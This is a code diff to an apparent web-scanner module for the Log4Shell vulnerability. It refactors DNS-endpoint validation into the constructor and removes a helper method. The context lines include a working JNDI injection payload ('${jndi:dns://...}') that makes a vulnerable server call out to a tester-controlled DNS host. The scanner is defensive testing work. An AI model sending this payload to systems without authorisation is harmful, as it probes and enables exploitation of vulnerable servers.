@@ -32,7 +32,12 @@ class ModuleLog4Shell(Attack):
 
     def __init__(self, crawler, persister, attack_options, stop_event, crawler_configuration):
         Attack.__init__(self, crawler, persister, attack_options, stop_event, crawler_configuration)
-        if not self._is_valid_dns(attack_options.get("dns_endpoint")):
+
+        dns_endpoint = attack_options.get("dns_endpoint")
+        try:
+            self._dns_host = socket.gethostbyname(dns_endpoint)
+        except (OSError, TypeError):
+            logging.error(f"Error: {dns_endpoint} is not a valid domain name")
             self.finished = True
 
     async def must_attack(self, request: Request, response: Optional[Response] = None):
@@ -333,13 +338,3 @@ class ModuleLog4Shell(Attack):
         # The payload needs to be split because we are using the formatted string syntax to modify it dynamically,
         # but it is also using this syntax for the exploit.
         return "${jndi:dns://" + f"{self.dns_endpoint}/{unique_id}" + ".l}"
-
-    def _is_valid_dns(self, dns_endpoint: str) -> bool:
-        if dns_endpoint is None:
-            return False
-        try:
-            self._dns_host = socket.gethostbyname(dns_endpoint)
-        except OSError:
-            logging.error(f"Error: {dns_endpoint} is not a valid domain name")
-            return False
-        return True
